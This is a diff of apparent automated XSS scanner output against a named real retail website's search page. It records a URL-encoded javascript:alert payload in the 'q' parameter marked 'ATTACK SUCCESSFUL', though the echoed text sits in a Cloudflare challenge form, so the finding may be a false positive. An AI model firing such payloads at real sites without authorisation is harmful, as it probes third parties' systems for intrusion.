@@ -1,4 +1,4 @@
-https://www.burpee.com/gardening-supplies/
+https://www.burpee.com/customer-favorites/
 
 GET Params:[1]
 ['q']
@@ -77,4 +77,4 @@ URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleR
 
 => ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
 Detection of Payload: 
-<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=cdf9320b31714eee1c3f2cabc13cbfe43b30bfbb-1586151419-0-AcOTaFSqy9ek-zRJCJWFZ2NN4OUiGS8U-_yPb-xkY9QnzRDp7PCcMm1GsTF90NeA9Bw6LAzj-7yR-Hx6j0qhpOSWSjtxJeYD6T66q7qLmK6kKCAynL2Zi0r4XIwHisdneMHFIrzyoK5Z3MH5hl8p44jElOg3L40ARezN51sZFJJOThmFavWXU93Y_esCG6GaLWL1rkBqMFu_3uH7tBwriYdvKV_byKPHt4Rd6-rWOzOiXtvvpQVUTS3jMnMlCakPPd18V2-NG03D5TwlufUc9sDhMNKkeKTWPBMZHbYU8R9GFJtoR59w1ZLx0SRBEpBcxWZJ9UluMu9Q9Ix1j5R6gKl0J490BxaRPdmOFJtbEjEkjBJn2JKsAxKqzHrlsRNZeVjZ0VYYGQaf-dJUBaSNX61OZnCgbYdFBtySvy3rP-sGh-tpB2Ta9W-KCD5P2w9EBO0c7l06YFN8wnF4I35lhfWT0t1oKuuXTsGCeMJcNEnloSd4dn0NXkl-eLBJ9DRiotzacMhYAJapA17z445UyiOv07EQk5lbBbqtIXZiy8MQMaBY4GMqFHP2oCIX6X_3ki3GkddSn2-aBRn9A6VMIWQ" method="POST" enctype="application/x-www-form-urlencoded">
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=54a5293b3d95ab1c85643d8069ff870deb947f24-1586151471-0-ASGsibK_IfqiRQpT_9FAgC8Zg2f4V06L7ctpMAMYrUbcmh4Zvs1R9gEtVKCEwoH9Lj5fba2JJIu1OtpDaCqy-i_e2Li53rwb2SssbCnf8OUcUjZpqEFGVnX-__hi_nl1jI5Q-WXPglv3v7DqIT0jJL-hkxCdLZ5nKiNW4gpjiFAqgyO1IYlOnQOLexD1bbeCdjnwSLUkRIJC01lMoX0YRdjcMVMei8924ODRR55vH_mcnDhFDZ-cb17nqpf6fpA-yan0Zo3z-3kgKhihfv11_uY296fL3q_5a_j-3qRihn5CCpc2IBwbm_3sF21fEQ4c7v9vfeAjtK5aZEYZ0_ntiCfbY-gLNTis00sT33LkZ9XIraNuUN4cNa6iUkt-2-n5pG4G4MVJWmiWog063bUMeK7B9owUNE-33WkBlVeBQmJZuAmgo3hz9a7iCN_yxfsy5QLOf3PRi3R3Y7GSRucV7agO7THOQ430P4ebdHi9SExsWM0WTJwb4HrWjBdeHMngiiaQNVvamYDYumnyVW0yxAs_qTY5dYQLGj2Nux3pCx_OmrCt1NCAtoFI1FXzSE-9nLgFCalvq9XVPiWJX61pEfc" method="POST" enctype="application/x-www-form-urlencoded">
